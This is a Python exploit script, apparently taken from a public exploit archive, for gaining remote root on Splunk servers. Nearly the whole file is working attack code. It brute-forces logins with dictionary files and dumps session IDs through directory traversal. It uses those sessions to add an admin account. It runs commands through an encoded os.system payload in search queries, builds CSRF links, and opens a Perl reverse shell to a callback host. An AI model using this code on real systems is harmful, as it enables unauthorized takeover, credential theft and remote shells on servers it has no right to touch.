from sec1httplib.requestbuilder import Requestobj
from sec1httplib.thread_dispatcher import *
import threading
import re
import urlparse
import sys
import urllib
import base64
from optparse import OptionParser
import sys


"""
Source: http://www.sec-1.com/blog/?p=233

Splunk remote root exploit.

Author: Gary O'leary-Steele @ Sec-1 Ltd
Date:   5th September 2011
Release date: Private

Full Package: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/18245.zip

C:\git\splunk>python splunk_exploit.py -h
Usage: Run splunk_exploit.py -h to see usage options

Options:
  --version          show program's version number and exit
  -h, --help         show this help message and exit
  -t TARGETHOST      IP Address or hostname of target splunk server
  -c                 Generate CSRF URL only
  -w SPLUNKWEB_PORT  The Splunk admin interface port (Default: 8000)
  -d SPLUNKD_PORT    The Splunkd Web API port (Default: 8089)
  -u USERFILE        File containing usernames for use in dictionary attack
  -p PASSFILE        File containing passwords for use in dictionary attack
  -U USERNAME        Admin username (if known)
  -P PASSWORD        Admin pasword (if known)


ToDo: Fix bug when attemping to get home dir

"""

#Set this to use a proxy
#Requestobj.set_proxy("127.0.0.1","8080")

Requestobj.verbose = 0
misc_lock = threading.Lock()

# Counter used in bruteforce
class Counter():
    def __init__(self):
        self.l = threading.Lock()

    def set_total(self,total):
        self.statictotal = total
        self.total = total
    def sub(self):
        with self.l:
            if self.total !=0:
                self.total = self.total - 1
    def print_remaining(self):
        with self.l:
            print "[i] %s of %s remaining" % (self.total,self.statictotal)
counter = Counter()

def request_factory_splunkd(targeturl,username,password,splunk_object):
    "Factory to generate attempt_login functions"
    global counter
    def attempt_login():
        # Dont continue if we already have admin
        if splunk_object.got_admin == 1:
            return False

        login_url = "{0}/services/auth/login".format(targeturl.rstrip())
        r = Requestobj(login_url)
        poststr = "username={0}&password={1}".format(username.rstrip(),password.rstrip())
        r.rawpostdata("POST", poststr)
        result = r.makerequest()
        counter.sub()
        counter.print_remaining()
 

        if result.find_data("Remote login disabled because you are using a free license"):
            print "[i] Free licence in use. No remote login required"
            print "[!] run the exploit again with the -f flag"
            sys.exit()
        
        if result.find_data("sessionKey"):
            print "[***] Cracked: %s:%s\n" % (username.rstrip(),password.rstrip())
            try:
                if splunk_object.user_is_admin(username.rstrip(),password.rstrip()):
                    splunk_object.username = username.rstrip()
                    splunk_object.password = password.rstrip()
                    splunk_object.got_admin =1
                    #print "ADMIN",splunk_object.got_admin
                    splunk_object.session_key = re.findall("<sessionKey>(.+?)</sessionKey>",result.body)[0]
            except Exception as err:
                print "[i] Error getting auth details",err

            return (username,password)
        else:
            pass
    return attempt_login


def request_factory_splunkweb(targeturl,username,password,cval,splunk_object):
    "Factory to generate attempt_login functions"
    global counter

    def attempt_login():
        if splunk_object.got_admin == 1:
            return False

        login_url = "{0}/en-GB/account/login".format(targeturl.rstrip())
        r = Requestobj(login_url)
        poststr = "cval={0}&return_to=%2Fen-GB%2F&username={1}&password={2}".format(cval,username.rstrip(),password.rstrip())
        r.rawpostdata("POST", poststr)
        r.set_custom_cookie(copyglobaljar=1)
        result = r.makerequest()
        counter.sub()
        counter.print_remaining()

            
        if result.find_data("This resource can be found at"):
            print "[***] Cracked: %s:%s" % (username.rstrip(),password.rstrip())
            try:
                if splunk_object.user_is_admin(username.rstrip(),password.rstrip()):
                    splunk_object.username = username.rstrip()
                    splunk_object.password = password.rstrip()
                    splunk_object.got_admin =1
            except Exception as err:
                print "[i] Error getting auth details",err

            return (username,password)
        else:
            pass
    return attempt_login



class SplunkTarget(object):
    def __init__(self,hostaddr,splunkd_port=8089,splunkweb_port=8000):
        
        self.splunkd_port = splunkd_port
        self.splunkweb_port = splunkweb_port
        self.max_threads = 20
        self.username=""
        self.password = ""
        self.session_key =""
        self.splunk_home = ""
        self.got_admin = 0
        self.web_authed = 0 # are we authed to the web interface
        self.freelic =0
        # Check splunkd server
        info = Requestobj("https://{0}:{1}/services/server/info/server-info".format(hostaddr,splunkd_port)).makerequest()
        if info.body:
            self.splunkd_url = "{0}://{1}".format(urlparse.urlparse(info.url).scheme,urlparse.urlparse(info.url).netloc)
        else:
            info = Requestobj("http://{0}:{1}/services/server/info/server-info".format(hostaddr,splunkd_port)).makerequest()
            self.splunkd_url = "{0}://{1}".format(urlparse.urlparse(info.url).scheme,urlparse.urlparse(info.url).netloc)

        if "server-info" in info.body:
 
            self.splunkd =1
            try:
                self.os_build = re.findall("os_build\">(.+?)<",info.body)[0]
                self.os_name = re.findall("os_name\">(.+?)<",info.body)[0]
                self.os_version = re.findall("os_version\">(.+?)<",info.body)[0]
                self.server_name = re.findall("serverName\">(.+?)<",info.body)[0]
                self.splunk_version = re.findall("\"version\">(.+?)<",info.body)[0]
                self.cpu_arch = re.findall("cpu_arch\">(.+?)<",info.body)[0]
                print "[i] Splunkd server found. Version:{0}".format(self.splunk_version)
                print "[i] OS:{0} {1} {2}".format(self.os_name,self.os_version,self.os_build)
            except Exception as err:
                print "Error getting splunk server info",err
        else:
            self.splunkd =0


        # Check splunk web
        splunkweb_info = Requestobj("http://{0}:{1}/en-GB/account/login".format(hostaddr,splunkweb_port)).makerequest()
        if splunkweb_info.body:
            self.splunkweb_url = "{0}://{1}".format(urlparse.urlparse(splunkweb_info.url).scheme,urlparse.urlparse(splunkweb_info.url).netloc)
        else:
            splunkweb_info = Requestobj("https://{0}:{1}/en-GB/account/login".format(hostaddr,splunkweb_port)).makerequest()
            self.splunkweb_url = "{0}://{1}".format(urlparse.urlparse(splunkweb_info.url).scheme,urlparse.urlparse(splunkweb_info.url).netloc)


        if "Splunk" in splunkweb_info.body:
            print "[i] Splunk web interface discovered"
            self.splunkweb =1
            self.cval=""
            try:
                self.cval = splunkweb_info.extract_data_body('name="cval" value="(\d+?)"')[0]
                print "[i] CVAL:{0}".format(self.cval)
            except:
                print "[i] Error getting cval"
                self.splunkweb =0

        else:
            self.splunkweb =0

        if self.splunkweb ==1:
            try:
                url ="{0}/en-GB/manager/system/licensing".format(self.splunkweb_url)
                lic = Requestobj(url).makerequest()
                if "<h1>Free license group</h1>" in lic.body:
                    print "[i] Configured with free licence. No auth required"
                    #if not self.splunkd:
                    #    print "[i] Cannot connect to splunkd using free licence"
                    #    sys.exit()
                    self.got_admin=1
                    self.username="admin"
                    self.password="admin"
                    self.web_authed=1
                    self.splunkd=0
                    self.freelic=1
                    self.pop_shell()

            except Exception as err:
                print "error",err
                exit()
    
    def account_bruteforce(self,userfile,passfile):
        global counter
        q = ThreadDispatcher(store_return=1,max_threads=self.max_threads)
        for username in set(open(userfile).readlines()):
            for password in set(open(passfile).readlines()):

                if self.splunkd == 1:
                    q.add(request_factory_splunkd(self.splunkd_url,username,password,self))
                elif self.splunkweb==1:
                    q.add(request_factory_splunkweb(self.splunkweb_url,username,password,self.cval,self))
                else:
                    print "[Error] Not connected"
                    sys.exit()

        counter.set_total(len(q.call_queue))
        q.start()

        for x in range(q.return_queue._qsize()):
            username, password = q.return_queue.get(x)
            username = username.rstrip()
            password = password.rstrip()
            print "[***] Cracked: %s:%s" % (username,password)


    def user_is_admin(self,username,password):
        if self.splunkd == 1:
            # attempt to auth via splunkd to get a sessionkey
            self.username = username
            self.password = password
            self.splunkd_auth()
            url = Requestobj("{0}/services/authentication/httpauth-tokens".format(self.splunkd_url))
            url.basic_auth(username,password)

            context = url.makerequest()
            
            if '<title>httpauth-tokens' in context.body:
                self.got_admin =1
                return True
            else:
                return False
        elif self.splunkweb == 1:
            with misc_lock:
                self.username = username
                self.password = password
                if self.splunkweb_auth():
                    admin_only = Requestobj("{0}/en-US/manager/launcher/server/settings/settings?action=edit".format(self.splunkweb_url)).makerequest()
                    if admin_only.find_data("Port that Splunk Web uses"):
                        print "[i] User:{0} IS AN ADMIN.".format(username)
                        return True
                    else:
                        print "[i] User:{0} is not an admin".format(username)
                else:
                    pass
                
        else:
            print "Not Connected"
            return False


    def search_payload_cmd(self,payload):
        "Generate a command execution payload"
        encoded = urllib.quote(base64.b64encode(payload))
        encodedpl = """search index=_internal source=*splunkd.log |mappy x=eval("sys.modules['os'].system(base64.b64decode('%s'))")""" % encoded
        #print encodedpl
        return encodedpl


    def get_splunk_home(self):
        if not self.username or not self.password:
            print "[i] Valid username and password required"
            sys.exit()
        try:
            r = Requestobj("{0}/services/properties/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fopt%2fsplunk%2fetc%2fsplunk-launch/default/SPLUNK_HOME".format(self.splunkd_url))
            r.basic_auth(self.username,self.password)
            splunkdir =  r.makerequest()

            if "ERROR" not in splunkdir.body and "Remote login disabled" not in splunkdir.body and self.splunkd:
                self.splunk_home = splunkdir.body.strip()
            else:
                print "[***] Could not get home dir setting default.."
                if "windows" in self.os_name.lower():
                    self.splunk_home = "c:\\program files\\splunk"
                else:
                    self.splunk_home = "/opt/splunk"

                print "Setting Splunk home dir to:{0}".format(self.splunk_home)

            return self.splunk_home

        except Exception as err:
            print "[i] Error occured while attempting to read splunk home dir",err
            

    def splunkd_auth(self):
        login_url = "{0}/services/auth/login".format(self.splunkd_url)
        r = Requestobj(login_url)
        poststr = "username={0}&password={1}".format(self.username.rstrip(),self.password.rstrip())
        r.rawpostdata("POST", poststr)
        result = r.makerequest()
        if result.find_data("Remote login disabled because you are using a free license"):
            print "[i] Free licence in use. No remote login required"
            print "[!] run the exploit again with the -f flag"
            sys.exit()

        if result.find_data("sessionKey"):
            self.session_key = re.findall("<sessionKey>(.+?)</sessionKey>",result.body)[0]
            return True
        else:
            return False


    def splunkweb_auth(self):

        if self.web_authed == 1:
            return True

        login_page = Requestobj("{0}/en-GB/account/login".format(self.splunkweb_url)).makerequest() # Get session cookie
        
        cval=""
        cval = login_page.extract_data_body('name="cval" value="(\d+?)"')
        if cval:
            cval = cval[0]
        r = Requestobj(login_page.url)
        poststr = "cval={0}&return_to=%2Fen-GB%2F&username={1}&password={2}".format(cval,self.username.rstrip(),self.password.rstrip())
        r.rawpostdata("POST", poststr)
        result = r.makerequest()
        
        if result.find_data("This resource can be found at"):
            return True
            self.web_authed = 1
        else:
            print "[i] Login Failed"
            exit()

    def add_admin(self,username,password,sessionKey):
        # look for 201
        if self.splunkd == 1 and self.username and self.password:
            url = Requestobj("{0}/servicesNS/-/launcher/authentication/users".format(self.splunkd_url))
            url.basic_auth(self.username,self.password)
            url.rawpostdata("POST","roles=user&roles=admin&name={0}&defaultApp=search&password={1}&email=&createrole=0&realname=".format(username,password))
            url.add_header("authorization","Splunk {0}".format(sessionKey))
            result = url.makerequest()
            if str(result.code) == "201":
                return True
            else:
                return False

        else:
            print "[!] Not connected to splunkd. Check port and creds"
            return False

    def dump_session_ids(self):
        "Exploits dir traversal issue to dump session ids"
        print "[i] Attemping to dump sessions"
        if self.splunkd == 1 and self.username and self.password:
            #url = Requestobj("{0}/servicesNS/-/system/properties/..%2f..%2f..%2f..%2f..%2fopt%2fsplunk%2fvar%2flog%2fsplunk%2fweb_service.log%00/default".format(self.splunkd_url))
            url = Requestobj("{0}/servicesNS/-/system/properties/..%2f..%2f..%2fvar%2flog%2fsplunk%2fweb_service.log%00/default".format(self.splunkd_url))

            url.basic_auth(self.username,self.password)
            result = url.makerequest()
            sessions=[]
            if "session=" in result.body:
                print "[i] Session ID's extracted from web_service.log"
                sessions = re.findall("session=(.+?)[<\s]",result.body)
            for session in set(sessions):
                print "[SESSION]",session
            return set(sessions)

    def perl_revshell(self,revhost,port):
        cmd="""perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % (revhost,port)
        self.search_exploit_cmd(cmd)


    def search_exploit_cmd(self,command):
        "Execute commands via search exploit."

        if self.splunkweb == 1 and self.got_admin:
            if self.web_authed == 0:
                self.splunkweb_auth()
                
            print "[i] Executing Command:{0}".format(command)
            attack_body = self.search_payload_cmd(command)#
            attack_body = urllib.quote(urllib.unquote(attack_body))
            shell_req = Requestobj("{0}/en-GB/api/search/jobs".format(self.splunkweb_url))
            shell_req.rawpostdata("POST","search={0}&status_buckets=300&namespace=search&ui_dispatch_app=search&ui_dispatch_view=flashtimeline&auto_cancel=100&required_field_list=*&earliest_time=&latest_time=".format(attack_body))
            for c in shell_req.get_cookiejar():
                if "session" in c.name:
                    shell_req.add_header("X-Requested-With","XMLHttpRequest")
                    shell_req.add_header("X-Splunk-Session",c.value)
            x = shell_req.makerequest()

        elif self.splunkd == 1 and self.got_admin and self.session_key:

            print "[i] Executing Command:{0}".format(command)
            attack_body = self.search_payload_cmd(command)#
            attack_body = urllib.quote(urllib.unquote(attack_body))
            shell_req = Requestobj("{0}/servicesNS/admin/search/search/jobs".format(self.splunkd_url))
            shell_req.rawpostdata("POST","ui_dispatch_app=search&search={0}&required_field_list=%2A&ui_dispatch_view=flashtimeline&max_count=10000&time_format=%25s.%25Q&latest_time=&status_buckets=300&earliest_time=&auto_cancel=100".format(attack_body))
            shell_req.add_header("authorization","Splunk {0}".format(self.session_key))
            x = shell_req.makerequest()
        else:
            print "Session",self.session_key
            print "Admin",self.got_admin
            print "Splunkd",self.splunkd
            print "[i] Exploit failed. Not connected or access denied"

    def blind_shell(self):
        command=""
        while 1:
            print command.rstrip()
            command=raw_input("blind_shell>")#
            if command.rstrip() == "exit": break
            self.search_exploit_cmd(command)


    def get_csrf_link_cmd(self,command):
        return "{0}/en-US/app/search/flashtimeline?q={1}&earliest=0".format(self.splunkweb_url,self.search_payload_cmd(command))

    def get_csrf_link_revshell(self,revhost,port):
        cmd="""perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % (revhost,port)
        return "{0}/en-US/app/search/flashtimeline?q={1}&earliest=0".format(self.splunkweb_url,self.search_payload_cmd(cmd))

    def search_exploit_psudoshell(self):
        "Execute commands via search exploit. Payload implements a virtual shell"
        if not self.username or not self.password:
            print "[i] Valid username and password required"
            sys.exit()
        if not self.splunkweb == 1:
            print "[error] Managment Web Interface required for this payload"
            return ""
        
        if self.web_authed == 0:
            self.splunkweb_auth()

        base_dir = self.get_splunk_home()
        #if not base_dir:
        #    print "Failed to get splunk basedir"
        #    base_dir = "/opt/splunk"

        command=""
        while 1:
            print command.rstrip()
            command=raw_input("shell>")#
            if command.rstrip() == "exit": break

            if "windows" in self.os_name.lower():
                tmp = ">\"{0}\\share\splunk\search_mrsparkle\exposed\js\.tmp\"".format(base_dir)
                command = command + tmp #'"'+ tmp +'"'
            else:
                tmp = ">{0}/share/splunk/search_mrsparkle/exposed/js/.tmp".format(base_dir)
                command = command + tmp
            
            attack_body = self.search_payload_cmd(command)#

            attack_body = urllib.quote(urllib.unquote(attack_body))
            psudoshell_req = Requestobj("{0}/en-GB/api/search/jobs".format(self.splunkweb_url))
            psudoshell_req.rawpostdata("POST","search={0}&status_buckets=300&namespace=search&ui_dispatch_app=search&ui_dispatch_view=flashtimeline&auto_cancel=100&required_field_list=*&earliest_time=&latest_time=".format(attack_body))
            for c in psudoshell_req.get_cookiejar():
                if "session" in c.name:
                    psudoshell_req.add_header("X-Requested-With","XMLHttpRequest")
                    psudoshell_req.add_header("X-Splunk-Session",c.value)
            x = psudoshell_req.makerequest()
            import time
            time.sleep(3)
            print Requestobj("{0}/en-US/static/@105575/js/.tmp".format(self.splunkweb_url)).makerequest().body

    def pop_shell(self):
        "Prompt for paylod options"
        "[w00p] We appear to have access. Please select a payload"
        print "[Payload Options]"
        if self.splunkweb == 1:
            print "[1]\tPseudo Interactive Shell"
        else:
            print "[DISABLED]\tPseudo Interactive Shell"
        
        print "[2]\tPerl Reverse Shell"
        print "[3]\tCommand Exec (Blind)"
        option = input("Please select option 1-3:")
        if option == 1:
            self.search_exploit_psudoshell()
        elif option ==2:
            rev_host = raw_input("Enter Callback Host:")
            rev_port = raw_input("Enter Callback Port:")
            self.perl_revshell(rev_host,rev_port)
        elif option ==3:
            self.blind_shell()
        else:
            print "Invalid option"
            exit()


def main():

    banner = "-----==[Slunk Remote Root Exploit]=-----\n"
    parser = OptionParser(usage="Run %prog -h to see usage options",
                          version="%prog 1.0")
    parser.add_option("-t",
                      action="store",
                      dest="targethost",
                      help="IP Address or hostname of target splunk server")



    parser.add_option("-c",
                      action="store_true", # optional because action defaults to "store"
                      dest="csrf",
                      help="Generate CSRF URL only")


    parser.add_option("-f",
                      action="store_true", # optional because action defaults to "store"
                      dest="free_lic_noauth",
                      help="Target is configured to use a Free licence and does not permit remote auth")

    parser.add_option("-w",
                      action="store", # optional because action defaults to "store"
                      dest="splunkweb_port",
                      default=8000,
                      help="The Splunk admin interface port (Default: 8000)")

    parser.add_option("-d", 
                      action="store", # optional because action defaults to "store"
                      dest="splunkd_port",
                      default=8089,
                      help="The Splunkd Web API port (Default: 8089)")


    parser.add_option("-u", 
                      action="store", # optional because action defaults to "store"
                      dest="userfile",
                      help="File containing usernames for use in dictionary attack")

    parser.add_option("-p", 
                      action="store", # optional because action defaults to "store"
                      dest="passfile",
                      help="File containing passwords for use in dictionary attack")


    parser.add_option("-U", 
                      action="store", # optional because action defaults to "store"
                      dest="username",
                      help="Admin username (if known)")


    parser.add_option("-P",
                      action="store", # optional because action defaults to "store"
                      dest="password",
                      help="Admin pasword (if known)")

    parser.add_option("-e",
                     action="store", # optional because action defaults to "store"
                     dest="userpair",
                     help="Attempt to add admin user via priv up directory traversal magic. Accepts username:password")


    (options, args) = parser.parse_args()


    if not options.targethost:
        parser.error("Target host required")
        exit()

    elif options.targethost and options.free_lic_noauth:
        x = SplunkTarget(options.targethost,splunkweb_port=options.splunkweb_port,splunkd_port=options.splunkd_port)
        x.username="admin"
        x.password="admin"
        x.got_admin=1
        x.splunkd = 0
        x.pop_shell()
        
    elif options.targethost and options.csrf:
        x = SplunkTarget(options.targethost,splunkweb_port=options.splunkweb_port,splunkd_port=options.splunkd_port)
        print "[*] Enter command to run or enter 'revshell' for a perl reverse shell:"
        option = raw_input("cmd>")
        if option =="revshell":
            rev_host = raw_input("Enter Callback Host:")
            rev_port = raw_input("Enter Callback Port:")
            x.perl_revshell(rev_host,rev_port)
            print x.get_csrf_link_revshell(rev_host,rev_port)
        else:
            print x.get_csrf_link_cmd(option.strip())

    elif options.targethost and options.username and options.password and options.userpair:
        print "[i] Attemping priv up"
        if ":" in options.userpair:
            username,password = options.userpair.split(":")
        else:
            print "-e requires username password pair in format username:password"
        
        x = SplunkTarget(options.targethost,splunkweb_port=options.splunkweb_port,splunkd_port=options.splunkd_port)
        x.username= options.username
        x.password = options.password
        x.splunkd = 1
        import time
        while 1:
            sessionids= x.dump_session_ids()
            for session in sessionids:
                if x.add_admin(username,password,session):
                    print "[i] User Added"
                    exit()
            time.sleep(2)
            
    elif options.targethost and options.username and options.password:
        print "[i] Using static username and password"
        x = SplunkTarget(options.targethost,splunkweb_port=options.splunkweb_port,splunkd_port=options.splunkd_port)
        x.username= options.username
        x.password = options.password
        if x.user_is_admin(options.username,options.password):
            x.pop_shell()

    elif options.targethost and options.userfile and options.passfile:
        print "[i] Lauching bruteforce attack"
        x = SplunkTarget(options.targethost,splunkweb_port=options.splunkweb_port,splunkd_port=options.splunkd_port)
        x.account_bruteforce(options.userfile,options.passfile)
        if x.got_admin ==1:
            x.pop_shell()
        
    else:
        print "Please ensure you have supplied either a username and password or a user and password file to bruteforce"
        exit()


if __name__ == '__main__':
    main()